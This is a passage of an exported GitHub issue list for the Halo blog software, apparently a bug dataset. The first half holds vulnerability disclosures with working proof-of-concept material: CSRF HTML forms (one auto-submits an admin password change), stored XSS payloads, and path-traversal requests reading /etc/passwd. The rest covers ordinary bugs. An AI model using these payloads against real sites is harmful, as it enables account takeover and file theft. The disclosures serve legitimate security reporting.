payload: ``` &lt;html&gt;   &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;   &lt;body&gt;   &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;     &lt;form action="https://demo.halo.run/admin/tag/save" method="POST"&gt;       &lt;input type="hidden" name="tagName" value="&amp;lt;script&amp;gt;alert&amp;#40;1&amp;#41;&amp;lt;&amp;#47;script&amp;gt;" /&gt;       &lt;input type="hidden" name="tagUrl" value="123" /&gt;       &lt;input type="submit" value="Submit request" /&gt;     &lt;/form&gt;   &lt;/body&gt; &lt;/html&gt; ``` ![image](https://user-images.githubusercontent.com/18072317/55539771-0eb0fd80-56f4-11e9-972b-ab523ff0be04.png)  XSS payload: ``` POST /admin/tag/save HTTP/1.1 Host: demo.halo.run User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://demo.halo.run/admin/tag Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 54 Connection: close Cookie: JSESSIONID=7pY4KPxPbsy7pPOuJ_5OghgiMpv14yT9XbfW_p20 Pragma: no-cache Cache-Control: no-cache  tagName=%3Cscript%3Ealert(1)%3C%2Fscript%3E&amp;tagUrl=123 ``` when admin user  post a article,the XSS payload in tag value would exec. ![image](https://user-images.githubusercontent.com/18072317/55539444-3ce20d80-56f3-11e9-8786-51b376f17121.png) </body>
		<created>2019-04-04 08:13:39</created>
		<closed>2019-05-28 17:53:41</closed>
	</bug>
	<bug>
		<id>132</id>
		<title>A Arbitrary File reading in the backend</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://docs.halo.run/) - [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/ruibaby/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 (security)  ---  There is a Arbitrary file reading in the backend was discovered in halo release v0.4.3  There is a Arbitrary file reading vulnerability  exists in the themes/editor page. Vulnerability url: `https://demo.halo.run/admin/themes/editor`  eg.   ``` GET /admin/themes/getTpl?tplName=../../../../../../../../etc/passwd HTTP/1.1 Host: demo.halo.run User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:64.0) Gecko/20100101 Firefox/64.0 Accept: */* Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Accept-Encoding: gzip, deflate Referer: https://demo.halo.run/admin/themes/editor X-Requested-With: XMLHttpRequest Connection: close Cookie: JSESSIONID=7pY4KPxPbsy7pPOuJ_5OghgiMpv14yT9XbfW_p20 ``` ![image](https://user-images.githubusercontent.com/18072317/55538173-664d6a00-56f0-11e9-83f7-40c392a6a417.png) </body>
		<created>2019-04-04 07:46:35</created>
		<closed>2019-05-28 17:53:53</closed>
	</bug>
	<bug>
		<id>131</id>
		<title>A CSRF vulnerability at article post</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://docs.halo.run/) - [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/ruibaby/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 --- A CSRF vulnerability was discovered in halo release v0.4.3 There is a  CSRF vulnerability which allows remote attackers to send web page with CSRF script ,attackers could affected post any article text with this CSRF vulnerability.  Vulnerability url: `https://demo.halo.run/admin/posts/save`  eg. you should change the value of postUrl to Complete once pentest，eg,`&lt;input type="hidden" name="postUrl" value="1554359315872" /&gt;` ``` &lt;html&gt;   &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;   &lt;body&gt;   &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;     &lt;form action="https://demo.halo.run/admin/posts/save" method="POST"&gt;       &lt;input type="hidden" name="postStatus" value="0" /&gt;       &lt;input type="hidden" name="postTitle" value="test" /&gt;       &lt;input type="hidden" name="postUrl" value="1554359315872" /&gt;       &lt;input type="hidden" name="postContentMd" value="test123" /&gt;       &lt;input type="hidden" name="postThumbnail" value="&amp;#47;static&amp;#47;halo&amp;#45;frontend&amp;#47;images&amp;#47;thumbnail&amp;#47;thumbnail&amp;#46;png" /&gt;       &lt;input type="hidden" name="cateList" value="" /&gt;       &lt;input type="hidden" name="tagList" value="" /&gt;       &lt;input type="hidden" name="allowComment" value="1" /&gt;       &lt;input type="hidden" name="postPassword" value="" /&gt;       &lt;input type="submit" value="Submit request" /&gt;     &lt;/form&gt;   &lt;/body&gt; &lt;/html&gt;  ``` ![image](https://user-images.githubusercontent.com/18072317/55534355-c3dcb900-56e6-11e9-9e41-94f2f97de8af.png) ![image](https://user-images.githubusercontent.com/18072317/55534575-6006c000-56e7-11e9-9b7a-2f1ae6aeb3e7.png) </body>
		<created>2019-04-04 06:39:53</created>
		<closed>2019-05-28 17:54:05</closed>
	</bug>
	<bug>
		<id>130</id>
		<title>There is a file download vulnerability</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://docs.halo.run/) - [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/ruibaby/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持\  ## Bug Report I found that your system have a features to allow user send the backup file to Email : ) code: ```java     @GetMapping(value = "sendToEmail")     @ResponseBody     public JsonResult sendToEmail(@RequestParam("fileName") String fileName,                                   @RequestParam("type") String type,                                   HttpSession session) {         final String srcPath = System.getProperties().getProperty("user.home") + "/halo/backup/" + type + "/" + fileName;         final User user = (User) session.getAttribute(USER_SESSION_KEY);         if (null == user.getUserEmail() || StrUtil.isEmpty(user.getUserEmail())) {             return new JsonResult(ResultCodeEnum.FAIL.getCode(), localeMessageUtil.getMessage("code.admin.backup.no-email"));         }         if (StrUtil.equals(OPTIONS.get(BlogPropertiesEnum.SMTP_EMAIL_ENABLE.getProp()), TrueFalseEnum.FALSE.getDesc())) {             return new JsonResult(ResultCodeEnum.FAIL.getCode(), localeMessageUtil.getMessage("code.admin.common.no-post"));         }         new EmailToAdmin(srcPath, user).start();         return new JsonResult(ResultCodeEnum.SUCCESS.getCode(), localeMessageUtil.getMessage("code.admin.backup.email-success"));     } ``` you have do nothing filter with fileName and type from user type in ```java System.getProperties().getProperty("user.home") + "/halo/backup/" + type + "/" + fileName; ``` so I can use type `../../../../` to download any file I want~ as the HTTP Requests: ```http GET /admin/backup/sendToEmail?type=../../../../../../../&amp;fileName=etc/passwd HTTP/1.1 Host: ********* User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.47 Safari/537.36 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: X-Requested-With: XMLHttpRequest Connection: close Cookie: X-Forwarded-For: 127.0.0.2 ``` and I received the file: &lt;img width="836" alt="图片" src="https://user-images.githubusercontent.com/26483211/55534115-ffc34e80-56e5-11e9-98b7-0446a2d2f4de.png"&gt; Open it ![图片](https://user-images.githubusercontent.com/26483211/55534128-081b8980-56e6-11e9-95bb-3b56447e428a.png) ~ But how can I sign as the admin? XD I find that you have no csrf protect in the code, so I can use  ```html &lt;html&gt;   &lt;body&gt;     &lt;form action="http://youryhostname/admin/profile/save" method="POST" id="test"&gt;       &lt;input type="hidden" name="userId" value="1" /&gt;       &lt;input type="hidden" name="userPass" value="7fef6171469e80d32c0559f88b377245" /&gt;      &lt;!-- password is admin888 --&gt;       &lt;input type="hidden" name="userName" value="Art3mis" /&gt;       &lt;input type="hidden" name="userDisplayName" value="a" /&gt;       &lt;input type="hidden" name="userEmail" value="art3mis&amp;#64;art3mis&amp;#46;top" /&gt;       &lt;input type="hidden" name="userAvatar" value="" /&gt;       &lt;input type="hidden" name="userDesc" value="" /&gt;       &lt;input type="submit" value="Submit request" /&gt;     &lt;/form&gt;   &lt;/body&gt;   &lt;script&gt;     var f=document.getElementById("test");     f.submit();   &lt;/script&gt; &lt;/html&gt;  ``` I can leave a url message with the HTML, and you click in, you're password will change to `admin888`, and I can read you system file to getshell~</body>
		<created>2019-04-04 06:36:33</created>
		<closed>2019-05-28 17:54:13</closed>
	</bug>
	<bug>
		<id>127</id>
		<title>These is Another stored xss vulnerability</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://docs.halo.run/) - [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/ruibaby/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ## Bug Report  I find that You have do HtmlUtil.escape for CommentContent ![图片](https://user-images.githubusercontent.com/26483211/55527086-22476e80-56ca-11e9-9953-d30d7b609a83.png) but do nothing with CommentAuthorUrl ![图片](https://user-images.githubusercontent.com/26483211/55527337-2d4ece80-56cb-11e9-816f-d00e281afd43.png)  payload:`commentAuthorUrl="&gt;&lt;img src=1 onerror=alert(123)&gt;`\ &lt;img width="902" alt="图片" src="https://user-images.githubusercontent.com/26483211/55527127-4440f100-56ca-11e9-93a3-58726ea901de.png"&gt; ```http POST /newComment HTTP/1.1 Host: xxxxxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.47 Safari/537.36 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer:  Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 306 Connection: close Cookie: JSESSIONID= X-Forwarded-For: 127.0.0.2  postId=3&amp;commentContent=sasas&amp;commentAuthor=as12%22%3E%3Ca%3E3&amp;commentAuthorEmail=&amp;commentAuthorUrl=%22%3E%3Cimg+src%3D1+onerror%3Dalert(123)%3E233&amp;commentAgent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F73.0.3683.47+Safari%2F537.36&amp;commentParent=28 ``` in uri `/admin/comments?status=1` &lt;img width="1406" alt="图片" src="https://user-images.githubusercontent.com/26483211/55527020-ea402b80-56c9-11e9-9899-cfd577514b9c.png"&gt; </body>
		<created>2019-04-04 03:19:25</created>
		<closed>2019-05-28 17:53:29</closed>
	</bug>
	<bug>
		<id>126</id>
		<title>These is A stored xss vulnerability</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://docs.halo.run/) - [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/ruibaby/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持 ## Bug Report In [issue 9](https://github.com/halo-dev/halo/issues/9), someone reported two storage XSS, and you have fixed, but the Second XSS. But it still has another output point `X-Forwarded-For` payload HTTP Requests ```http POST /admin/getLogin HTTP/1.1 Host: xxxx User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.47 Safari/537.36 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2 Referer: Content-Type: application/x-www-form-urlencoded; charset=UTF-8 X-Requested-With: XMLHttpRequest Content-Length: 56 Connection: close Cookie: JSESSIONID= X-Forwarded-For: 127.&lt;img src=1 onerror=alert(123)&gt;0.0.2  loginName=asas&amp;loginPwd=asas ``` &lt;img width="1096" alt="图片" src="https://user-images.githubusercontent.com/26483211/55526171-98e26d00-56c6-11e9-90dc-6dbe81885d3a.png"&gt; &lt;img width="1351" alt="图片" src="https://user-images.githubusercontent.com/26483211/55526211-b7486880-56c6-11e9-9024-2d4271807af7.png"&gt; </body>
		<created>2019-04-04 02:46:43</created>
		<closed>2019-05-28 17:54:36</closed>
	</bug>
	<bug>
		<id>123</id>
		<title>BUG 反馈</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://docs.halo.run/) - [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/ruibaby/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [ ] 添加新的特性或者功能 - [ ] 请求技术支持  ----  Halo后台就是编辑文章更新操作时，按了更新后，再不小心按到别的菜单后修改的内容更新了，可是再进来该更新的文件，会变成回没更新的，【写文章】【主题编辑】这两个功能都会出现这样的Bug。 现在的解决办法就是重启项目或则服务器...</body>
		<created>2019-04-02 07:49:01</created>
		<closed>2019-04-30 05:41:50</closed>
	</bug>
	<bug>
		<id>114</id>
		<title>关于Ehcache的问题</title>
		<body>SpringBoot官方支持Ehcache2.x版本，所以项目中的Ehcache3.x没有起作用，而是使用了默认的SpringCache，希望Git主改一下，亲测~</body>
		<created>2019-03-07 12:06:46</created>
		<closed>2020-05-15 15:15:04</closed>
	</bug>
	<bug>
		<id>110</id>
		<title>七牛云上传附件失败</title>
		<body>报错信息 `{"error":"incorrect region, please use up-z1.qiniup.com"}` 我查了一下大概是这个原因，我在对象存储里面设置的分区是华北，但如果你没有在UploadManager里面特别设置zone的话，它默认往zong1传，zong1是华东。 所以在需要额外暴露一个设置空间区域的设定，或者放yaml里配，合理的应该是在做一个选项在附件设置里面，选择分区。  ```java         //————http上传,指定zone的具体区域——         //Zone.zone0:华东         //Zone.zone1:华北         //Zone.zone2:华南         //Zone.zoneNa0:北美         //———http上传，自动识别上传区域——         //Zone.httpAutoZone         //———https上传，自动识别上传区域——         //Zone.httpsAutoZone          Configuration config = new Configuration.Builder()                 .chunkSize(256 * 1024)  //分片上传时，每片的大小。 默认256K                 .putThreshhold(512 * 1024)  // 启用分片上传阀值。默认512K                 .connectTimeout(10) // 链接超时。默认10秒                 .responseTimeout(60) // 服务器响应超时。默认60秒                 .recorder(null)  // recorder分片上传时，已上传片记录器。默认null                 .recorder(null, null)  // keyGen 分片上传时，生成标识符，用于片记录器区分是那个文件的上传记录                 .zone(Zone.zone2) // 设置区域，指定不同区域的上传域名、备用域名、备用IP。                 .build();         this.uploadManager = new UploadManager(config);</body>
		<created>2019-03-04 15:28:02</created>
		<closed>2019-03-05 10:57:31</closed>
	</bug>
	<bug>
		<id>79</id>
		<title>文章发布后，再次进入文章编辑页面，文本框内仍有原文章内容</title>
		<body>&lt;!-- 如果你不认真勾选下面的内容，我可能会直接关闭你的 Issue。 提问之前，建议先阅读 https://github.com/ruby-china/How-To-Ask-Questions-The-Smart-Way --&gt;  **我确定我已经查看了** (标注`[ ]`为`[x]`)  - [x] [Halo 使用文档](https://docs.halo.run/) - [x] [Github Wiki 常见问题](https://github.com/ruibaby/halo/wiki/4.-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98) - [x] [其他 Issues](https://github.com/ruibaby/halo/issues)  ----  **我要申请**  (标注`[ ]`为`[x]`)  - [x] BUG 反馈 - [x] 添加新的特性或者功能 - [ ] 请求技术支持  ---- 文章发布后，如果想要再写一篇新文章，再次进入文本编辑页面后发现上一篇发布的文章内容仍留在文本框内 ![image](https://user-images.githubusercontent.com/26083044/51362415-7badf180-1b0e-11e9-8bfb-1916889ce699.png) </body>
		<created>2019-01-18 02:48:54</created>
		<closed>2019-02-11 11:01:50</closed>
	</bug>
	<bug>
		<id>65</id>
		<title>后台管理中的外观--&gt;菜单--&gt;选择一个菜单或者编辑“打开方式”为“新窗口”后，没有生效</title>
		<body>截图： ![image](https://user-images.githubusercontent.com/35838730/50220301-f5967200-03cc-11e9-856c-4ee6954bb018.png) </body>
		<created>2018-12-19 12:30:54</created>
		<closed>2018-12-20 01:02:06</closed>
	</bug>
	<bug>
		<id>64</id>
		<title>Halo博客备份功能失败，Backup database failed</title>
		<body>/var/log/messages 日志文件报错如下：  Dec 19 09:29:17 Mybwh java: 2018-12-19 09:29:17.508 ERROR 26701 --- [ XNIO-2 task-10] c.r.h.w.c.admin.BackupController         : Backup database failed: File [/root/halo/halo.mv.db] not exist!  [/root/halo/halo.mv.db 这个文件要不是自动代码自动导出的吗？需要手动导出么？</body>
		<created>2018-12-19 01:33:25</created>
		<closed>2018-12-19 06:14:46</closed>
	</bug>
	<bug>
		<id>55</id>
		<title>建议在dockerfile里设置时区</title>
		<body>直接拉取镜像，启动运行服务，发现系统记录的时间总是差8个小时，猜测是时区没有设置为东八区，建议在dockerfile里增加时区设置或参数指定 ``` ENV TZ=Asia/Shanghai RUN ln -snf /usr/share/zoneinfo/$TZ /etc/localtime &amp;&amp; echo $TZ &gt; /etc/timezone ```</body>
		<created>2018-12-04 02:31:51</created>
		<closed>2018-12-05 09:18:43</closed>
	</bug>
	<bug>
		<id>53</id>
		<title>点击写文章报错</title>
		<body> 点击文章，写文章 如下报错。 ![image](https://user-images.githubusercontent.com/39851813/48933440-3a98c700-ef3b-11e8-8717-79a6ef3ce87b.png) 2018-11-23 16:16:52.261 ERROR 9032 --- [ XNIO-5 task-33] freemarker.runtime                       : Error executing FreeMarker template  freemarker.core._TemplateModelException: Java method "org.springframework.web.servlet.support.RequestContext.getMessage(String)" threw an exception when invoked on org.springframework.web.servlet.support.RequestContext object "org.springframework.web.servlet.support.RequestContext@68cd760b"; see cause exception in the Java stack trace.  ---- FTL stack trace ("~" means nesting-related): - Failed at: ${springMacroRequestContext.getMessag...  [in template "spring.ftl" in macro "message" at line 28, column 22] - Reached through: @spring.message code=" common.js.all-...  [in template "admin/admin_post_md_editor.ftl" at line 234, column 132] ---- at freemarker.ext.beans._MethodUtil.newInvocationTemplateModelException(_MethodUtil.java:289) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.ext.beans._MethodUtil.newInvocationTemplateModelException(_MethodUtil.java:261) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.ext.beans.OverloadedMethodsModel.exec(OverloadedMethodsModel.java:65) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.MethodCall._eval(MethodCall.java:65) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Expression.eval(Expression.java:83) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.BuiltInsForOutputFormatRelated$AbstractConverterBI.calculateResult(BuiltInsForOutputFormatRelated.java:50) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.MarkupOutputFormatBoundBuiltIn._eval(MarkupOutputFormatBoundBuiltIn.java:40) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Expression.eval(Expression.java:83) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.DollarVariable.calculateInterpolatedStringOrMarkup(DollarVariable.java:100) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.DollarVariable.accept(DollarVariable.java:63) ~[freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visit(Environment.java:366) [freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.invoke(Environment.java:775) [freemarker-2.3.28.jar:2.3.28] at freemarker.core.UnifiedCall.accept(UnifiedCall.java:83) [freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visit(Environment.java:330) [freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visit(Environment.java:372) [freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visitAndTransform(Environment.java:495) [freemarker-2.3.28.jar:2.3.28] at freemarker.core.CompressedBlock.accept(CompressedBlock.java:42) [freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visit(Environment.java:330) [freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.visit(Environment.java:336) [freemarker-2.3.28.jar:2.3.28] at freemarker.core.Environment.process(Environment.java:309) [freemarker-2.3.28.jar:2.3.28] at freemarker.template.Template.process(Template.java:384) [freemarker-2.3.28.jar:2.3.28] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.processTemplate(FreeMarkerView.java:389) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.doRender(FreeMarkerView.java:302) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.view.freemarker.FreeMarkerView.renderMergedTemplateModel(FreeMarkerView.java:253) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.view.AbstractTemplateView.renderMergedOutputModel(AbstractTemplateView.java:178) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.view.AbstractView.render(AbstractView.java:316) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.render(DispatcherServlet.java:1370) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.processDispatchResult(DispatcherServlet.java:1116) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doDispatch(DispatcherServlet.java:1055) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.DispatcherServlet.doService(DispatcherServlet.java:942) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.processRequest(FrameworkServlet.java:998) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.servlet.FrameworkServlet.doGet(FrameworkServlet.java:890) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:645) [javax.servlet-api-4.0.1.jar:4.0.1] at org.springframework.web.servlet.FrameworkServlet.service(FrameworkServlet.java:875) [spring-webmvc-5.1.2.RELEASE.jar:5.1.2.RELEASE] at javax.servlet.http.HttpServlet.service(HttpServlet.java:750) [javax.servlet-api-4.0.1.jar:4.0.1] at io.undertow.servlet.handlers.ServletHandler.handleRequest(ServletHandler.java:74) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:129) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at org.springframework.web.filter.CharacterEncodingFilter.doFilterInternal(CharacterEncodingFilter.java:200) [spring-web-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.web.filter.OncePerRequestFilter.doFilter(OncePerRequestFilter.java:107) [spring-web-5.1.2.RELEASE.jar:5.1.2.RELEASE] at io.undertow.servlet.core.ManagedFilter.doFilter(ManagedFilter.java:61) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.FilterHandler$FilterChainImpl.doFilter(FilterHandler.java:131) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.FilterHandler.handleRequest(FilterHandler.java:84) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.security.ServletSecurityRoleHandler.handleRequest(ServletSecurityRoleHandler.java:62) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletChain$1.handleRequest(ServletChain.java:68) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletDispatchingHandler.handleRequest(ServletDispatchingHandler.java:36) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.security.SSLInformationAssociationHandler.handleRequest(SSLInformationAssociationHandler.java:132) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.security.ServletAuthenticationCallHandler.handleRequest(ServletAuthenticationCallHandler.java:57) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.security.handlers.AbstractConfidentialityHandler.handleRequest(AbstractConfidentialityHandler.java:46) [undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.security.ServletConfidentialityConstraintHandler.handleRequest(ServletConfidentialityConstraintHandler.java:64) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.security.handlers.AuthenticationMechanismsHandler.handleRequest(AuthenticationMechanismsHandler.java:60) [undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.security.CachedAuthenticatedSessionHandler.handleRequest(CachedAuthenticatedSessionHandler.java:77) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.security.handlers.AbstractSecurityContextAssociationHandler.handleRequest(AbstractSecurityContextAssociationHandler.java:43) [undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.server.handlers.PredicateHandler.handleRequest(PredicateHandler.java:43) [undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.SessionRestoringHandler.handleRequest(SessionRestoringHandler.java:119) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler.handleFirstRequest(ServletInitialHandler.java:292) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$100(ServletInitialHandler.java:81) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:138) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler$2.call(ServletInitialHandler.java:135) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.core.ServletRequestContextThreadSetupAction$1.call(ServletRequestContextThreadSetupAction.java:48) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.core.ContextClassLoaderSetupAction$1.call(ContextClassLoaderSetupAction.java:43) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler.dispatchRequest(ServletInitialHandler.java:272) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler.access$000(ServletInitialHandler.java:81) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.servlet.handlers.ServletInitialHandler$1.handleRequest(ServletInitialHandler.java:104) [undertow-servlet-2.0.14.Final.jar:2.0.14.Final] at io.undertow.server.Connectors.executeRootHandler(Connectors.java:360) [undertow-core-2.0.14.Final.jar:2.0.14.Final] at io.undertow.server.HttpServerExchange$1.run(HttpServerExchange.java:830) [undertow-core-2.0.14.Final.jar:2.0.14.Final] at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149) [na:1.8.0_151] at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624) [na:1.8.0_151] at java.lang.Thread.run(Thread.java:748) [na:1.8.0_151] Caused by: org.springframework.context.NoSuchMessageException: No message found under code ' common.js.all-attachment' for locale 'zh_CN'. at org.springframework.context.support.AbstractMessageSource.getMessage(AbstractMessageSource.java:161) ~[spring-context-5.1.2.RELEASE.jar:5.1.2.RELEASE] at org.springframework.context.support.AbstractApplicationContext.getMessage(AbstractApplicationContext.java:1277) ~[spring-context-5.1.2.RELEASE.jar:5.1.2.RELEASE] at 